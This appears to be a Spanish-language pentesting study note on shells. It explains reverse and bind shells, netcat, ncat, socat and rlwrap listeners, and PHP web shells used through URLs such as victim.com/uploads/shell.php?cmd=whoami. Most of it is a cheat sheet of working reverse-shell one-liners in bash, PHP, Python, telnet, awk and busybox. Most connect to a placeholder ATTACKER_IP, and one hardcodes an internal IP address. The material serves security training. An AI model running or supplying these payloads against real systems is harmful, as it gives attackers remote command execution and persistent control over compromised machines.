## ¿Qué es?

Un Shell es un software que nos permite interactuar con un Sistema Operativo. Puede tener una interfaz gráfica, pero usualmente es una interfaz por líneas de comandos.

En ciberseguridad, comúnmente se refiere a una sesión shell especifica que un atacante usa cuando accede a un sistema comprometido, permitiendoles ejecutar comandos y software. Esto los habilita de ejecutar varias actividades, como:

* Remote System Control: Permite al atacante ejecutar comandos o software remotamente en el sistema objetivo.
* Privilige Escalation: Si un acceso inicial a través de un shell está limitado o restringido, los atacantes pueden explorar maneras de escalar privilegios para estár más elevados o tener acceso administrativo.
* Data Exfiltration: Una vez el atacante tienen acceso para ejecutar comandos a través de la shell obtenida, pueden explorar el sistema para leer y copiar datos sensibles de él.
* Persistence and Maintenance Access: Una vez la shell es obtenida, los atacantes pueden crear accesos a través de usuarios y credenciales o copiar software de backdoor para mantener acceso al sistema objetivo para usos posteriores.
* Post-Exploitation Activities: Después del acceso de la shell garantizado, los atacantes pueden realizar una gran variedad de actividades post-exploitation, como desplegar malware, crear cuentas ocultas, y eliminar información.
* Access Other Systems on the Network: Dependiendo de las intenciones del atacante, la shell obtenida puede ser sólo un punto de acceso inicial. El objetivo puede ser saltar a través de la red a diferentes objetivos usando la shell obtenida como pivot a diferentes puntos en el sistema de red comprometido. A esto se le conoce como pivoting.

## Reverse Shell

Una shell reversa, a veces referida como "connect back shell", es una de las técnicas más populares para ganar acceso a un sistema. La conexión inicia desde el sistema del objetivo hacia la máquina del atacante, lo cual puede ayudar a evitar la detección desde los firewalls de la red y otras aplicaciones de seguridad.

### Netcat

Esta utilidad soporta mútliples OSs y permite leer y escribir a través de una red. Podemos usar Netcat para escuchar una conexión usando el comando `nc -lvnp 443`.

Este comando usa:

* `-l`: Indicar a Netcat que escuche o espere por una conexión.
* `-v`: Verbose mode.
* `-n`: Previene que las conexiones usen DNS, para que no resuelvan ningún hostname y usen la dirección IP.
* `-p`: Indica el puerto a usar para esperar la conexión.

Una vez tenemos nuestro listener listo, el atacante debería ejecutar lo que se conoce como un reverse shell payload. Este payload usualmente abusa la vulnerabilidad o acceso no autorizado garantizado por el atacante y ejecuta un comando que va a exponer la shell a través de la red. Hay una variedad de payloads que van a depender de las herrramientas y OS del sistema comprometido. Podemos ver algunas [aquí.](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 

Como ejemplo, vamos a analizar el siguiente ejemplo de payload llamado `pipe reverse shell`:

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

* `rm -f /tmp/f`: Ese comando remueve cualquier archivo pipe con archivo localizado en `/tmp/f`. Esto asegura que el script puede crear un nuevo named pipe sin conflictos.
* `mkfifo /tmp/f`: Este comando crea un named pipe, o FIFO (first-in first-out) en `/tmp/f`. Las tuberías con nombre permiten la comunicación bidireccional entre procesos. En este contexto, actúan como un conducto para la entrada y la salida de datos.
* `cat /tmp/f`: Este comando lee datos desde la named pipe. Espera por input que puede ser enviado a través de la tubería.
* `| bash -i 2>&1`: El output de `cat` es piped a una shell instance (`bash-i`), esto permite que el atacante ejecute comandos interactivamente. La instrucción `2>&1` redirige el error estándar a la salida estándar, asegurando que los mensajes de error se envíen de vuelta al atacante.
* `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Esta parte dirige la salida de la shell por medio de `nc` (Netcat) a la dirección IP del atacante (`ATTACKER_IP`) en el puerto del atacante (`ATTACKER_PORT`).
* `>/tmp/f`: Esta parte final envía la salida de los comandos de vuelta al named pipe, permitiendo comunicación bi-direccional.

La carga útil anterior puede exponer el intérprete de comandos `bash` a través de la red al oyente deseado.

Una vez el payload es ejecutado, el atacante va a recibir una reverse shell, permitiéndole ejecutar comandos como si estuvieran con sesión iniciada en una terminal regular en el OS.

## Bind Shell

Como su nombre indica, un shell de enlace vinculará un puerto en el sistema comprometido y escuchará una conexión; cuando se produce esta conexión, expone la sesión del shell para que el atacante pueda ejecutar comandos de forma remota.

El atacante puede usar un comando como este:

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`.

* `rm -f /tmp/f`: Ese comando remueve cualquier archivo pipe con archivo localizado en `/tmp/f`. Esto asegura que el script puede crear un nuevo named pipe sin conflictos.
* `mkfifo /tmp/f`: Este comando crea un named pipe, o FIFO (first-in first-out) en `/tmp/f`. Las tuberías con nombre permiten la comunicación bidireccional entre procesos. En este contexto, actúan como un conducto para la entrada y la salida de datos.
* `cat /tmp/f`: Este comando lee datos desde la named pipe. Espera por input que puede ser enviado a través de la tubería.
* `| bash -i 2>&1`: El output de `cat` es piped a una shell instance (`bash-i`), esto permite que el atacante ejecute comandos interactivamente. La instrucción `2>&1` redirige el error estándar a la salida estándar, asegurando que los mensajes de error se envíen de vuelta al atacante.
* `| nc -l 0.0.0.0 8080`: Empieza el modo escucha de Netcat (`-l`) en todas las interfaces (`0.0.0.0`) en el puerto `8080`. El shell va a ser expuesto al atacante una vez se conecta este puerto.
* `>/tmp/f`: Esta parte final envía la salida de los comandos de vuelta al named pipe, permitiendo comunicación bi-direccional.

Este comando ahora va a escuchar conexiones entrantes y exponer la interfaz de comandos `bash`. Debemos notar que los puertos por debajo de 1024 requieren que Netcat se ejecute con privilegios elevados. En este caso, usamos el puerto 8080 para evitar esto.

Ahora que la máquina objetivo está esperando conexiones entrantes, podemos usar Netcat nuevamente con el siguiente comando para conectar:

```shell
nc -nv TARGET_IP 8080
```

* `nc`: Invoca a Netcat, el cual establece la conexión con el objetivo.
* `-n`: Deshabilita la resolución DNS, permitiendo a Netcat operar rápidamente y evitar búsquedas innecesarias.
* `-v`: Verbose mode.
* `TARGET_IP`: La dirección IP del objetivo donde el bind shell está ejecutándose.
* `8080`: El número del puerto en el cual el bind shell está escuchando.

## Shell Listeners

Vamos a explorar algunas herramientas que pueden ser usadas para interactuar con una shell entrante.

### Rlwrap

Se trata de una pequeña utilidad que utiliza la biblioteca GNU readline para proporcionar un teclado de edición y un historial de comandos.

Ejemplo (mejorando una Shell Netcat con Rlwrap):

```shell
rlwrap nc -lvnp 443
```

Esto envuelve `nc` con `rlwrap`, permitiendo a los usuarios usar catacterísticas como las teclas de flecha y el historial para una mejor interacción.

### Ncat

Ncat es la versión mejorada de Netcap distribuido por el proyecto Nmap. Ofrece características extras, como encripción (SSL).

Ejemplo para escuchar Reverse Shells:

```shell
ncat -lvnp 4444
```

Ejemplo para escuchar Reverse Shells con SSL:

```shell
ncat --ssl -lvnp 4444
```

### Socat

Es una utilidad que nos permite crear un socket de conexión entre dos orígenes de datos, en este caso, dos hosts diferentes.

```shell
socat -d -d TCP-LISTEN:443 STDOUT
```

* `-d`: Activa el verbose output, se usa dos veces para incrementar el nivel de detalle de los comandos.
* `TCP-LISTE:443`: Crea un listener TCP en el puerto `443`, estableciendo un server socket para conexiones entrantes.
* `STDOUT`: Direcciona cualquier data entrante a la terminal.

## Shell Payloads

Una carga útil de shell puede ser un comando o script que expone el shell a una conexión entrante en el caso de un shell de enlace o a una conexión de envío en el caso de un shell inverso.

### Bash

**Normal Bash Reverse Shell**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

Esta shell reversa inicia una bash shell interactiva que redireccione el input y output a través de una conexión TCP a la IP del atacante en el puerto 443. El operador `>&` combina tanto la salida estándar como el error estándar.

**Bash Read Line Reverse Shell**

```bash
exec 5<>dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

Esta shell inversa crea un nuevo descriptor de archivo (el 5 en este caso) y se conecta a un socket TCP. Leerá y ejecutará comandos desde el socket, enviando la salida de vuelta a través del mismo socket.

**Bash With File Descriptor 196 Reverse Shell**

```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

Esta shell inversa utiliza un descriptor de archivo (196 en este caso) para establecer una conexión TCP. Permite que la shell lea comandos de la red y envíe la salida a través de la misma conexión.

**Bash With File Descriptor 5 Reverse Shell**

```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1<&5 2>&5
```

De forma similar al primer ejemplo, este comando abre un intérprete de comandos (bash -i), pero utiliza el descriptor de archivo 5 para la entrada y la salida, lo que permite una sesión interactiva a través de la conexión TCP.

### PHP

**PHP Reverse Shell Using the exec Function**

```bash
php -r '$socl=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3")'
```

Esta shell inversa crea una conexión de socket con la IP del atacante en el puerto 443 y utiliza la función exec para ejecutar una shell, redirigiendo la entrada y salida estándar.

**PHP Reverse Shell Using the shell_exec Function**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

Similar al comando anterior, pero usa la función `shell_exec`.

**PHP Reverse Shell Using the system Function**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

Este reverse shell emplea la función `system`, el cual ejecuta el comando y direcciona la salida del resultado al navegador.

**PHP Reverse Shell Using the passthru Function**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

La función passthru ejecuta un comando y envía la salida sin procesar al navegador. Esto resulta útil al trabajar con datos binarios.

**PHP Reverse Shell Using the popen Function**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

Este intérprete de comandos inverso utiliza popen para abrir un puntero de archivo de proceso, lo que permite ejecutar el intérprete.

### Python

Tenga en cuenta que los siguientes fragmentos de código requieren el uso de python -c para ejecutarse, como se indica con el marcador de posición PY-C.


**Python Reverse Shell by Exporting Environment Variables**

```bash
export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Este shell inverso establece el host remoto y el puerto como variables de entorno, crea una conexión de socket y duplica el descriptor de archivo del socket para la entrada/salida estándar.

**Python Reverse Shell Using the subprocess Module**

```bash
PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Esta shell inversa utiliza el módulo subprocess para generar una shell y configurar un entorno similar al del comando Python Reverse Shell by Exporting Environment Variables.

**Short Python Reverse Shell**

```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

Esta shell inversa crea uno o más sockets, se conecta al atacante y redirige la entrada, la salida y los errores estándar al socket mediante os.dup2().3

### Otros

**Telnet**

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

Esta shell inversa crea una tubería con nombre usando mkfifo y se conecta al atacante a través de Telnet en la IP ATTACKER_IP y el puerto 443.

**AWK**

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

Esta shell inversa utiliza las capacidades TCP integradas de AWK para conectarse a ATTACKER_IP:443. Lee los comandos del atacante y los ejecuta. Luego, envía los resultados de vuelta a través de la misma conexión TCP.

**BusyBox**

```bash
busybox nc ATTACKER_IP 443 -e sh
```

Esta shell inversa de BusyBox utiliza Netcat (nc) para conectarse al atacante en ATTACKER_IP:443. Una vez conectado, ejecuta /bin/sh, exponiendo la línea de comandos al atacante.

## Web Shell

Un Web Shell es un script escrito en un lenguaje compatible con un servidor web comprometido que ejecuta comandos a través del propio servidor. Generalmente, un web shell es un archivo que contiene el código para ejecutar comandos y gestionar archivos.

Puede estar oculto dentro de una aplicación o servicio web comprometido, lo que dificulta su detección y lo convierte en una herramienta muy popular entre los atacantes.

Los web shells pueden escribirse en varios lenguajes compatibles con servidores web, como PHP, ASP, JSP e incluso scripts CGI sencillos.

### Ejemplo de Web Shell PHP



Este shell puede ser guardado en un archivo con extensión PHP, como shell.php, y luego ser subido a un servidor web por un atacante explotando vulnerabilidades como Unrestricted File Upload, File Inclusion, Command Injection, entre otros, o al ganar acceso no autorizado a el.

![[Pasted image 20260414001552.png]]

Después de que el web shell es desplegado, puede ser accesible a través de la url en la que el web shell está hosteado, en este caso `http://victim.com/uploads/shell.php`. Como observamos en el código de shell.php, necesitamos tener un método GET y el valor de la variable `cmd`, el cual debería contener el comando que el atacante quiere ejecutar. Por ejemplo, si quisieramos ejecutar el comando whoami en la URL sería:

`http://victim.com/uploads/shell.php?cmd=whoami`

Lo anterior va a ejecutar el comando whoami y mostrará el resultado en el buscador web.

### Web Shells Existentes Disponibles en Línea

#### p0wny-shell

Un web shell PHP de un solo archivo minimalista que permite ejecución de comandos de forma remota.

#### b374k shell

Una web shell más rica en características con manejo de archivos y ejecución de comandos, entre otras funcionalidades.

#### c99 shell

Una web shell PHP muy conocida y robusta con funcionalidad extensiva.

